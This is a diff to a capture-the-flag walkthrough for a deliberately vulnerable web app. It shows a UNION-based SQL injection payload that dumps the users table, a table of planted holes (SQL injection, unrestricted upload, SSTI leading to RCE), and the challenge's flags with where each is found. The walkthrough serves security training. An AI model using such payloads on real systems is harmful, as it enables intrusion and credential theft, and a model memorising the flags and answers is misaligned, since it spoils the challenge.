@@ -24,11 +24,20 @@ results. Enter this in the search box (or as `?q=`):
 %' UNION SELECT username, password, role FROM users-- -
 ```
 
-The results list then shows:
+The results list then shows every row of the `users` table:
 
 ```
-tom-admin   (text column: @ndAouGot1t!)
+tom-admin        (text column: @ndAouGot1t!)                    role: admin
+service-backup   (text column: CWHS2026{sql_served_me_the_whole_garden})   role: none
 ```
+
+Two rewards in one dump:
+
+- **`tom-admin` / `@ndAouGot1t!`** — the admin credentials used in Step 2.
+- **`service-backup`** — a decoy account whose *password is a flag*
+  (`CWHS2026{sql_served_me_the_whole_garden}`). Its role is `none`, so it
+  **cannot** be used to log in (the admin form only accepts `role = admin`);
+  it exists purely as loot for dumping the table. This is the **database flag**.
 
 Useful variants:
 
@@ -172,3 +181,10 @@ challenge design (sudo misconfig, SUID, cron, etc.).
 | 1 | SQL injection            | `projects_detail` — f-string `SELECT` on `?q=` search |
 | 2 | Insecure file upload     | `admin_dashboard` — no upload validation |
 | 3 | SSTI → RCE               | `admin_preview` — reflected `render_template_string` (scanner-detectable); `blog_post` — stored, via uploaded file |
+
+## Flags
+
+| Flag | Where | How |
+|------|-------|-----|
+| `CWHS2026{sql_served_me_the_whole_garden}` | `service-backup` password in the `users` table | Step 1 — SQL injection dump (no login needed) |
+| `CWHS2026{rooted_like_a_begonia}` | `/home/analyst/user.txt` on the host | Step 3–4 — SSTI → RCE |
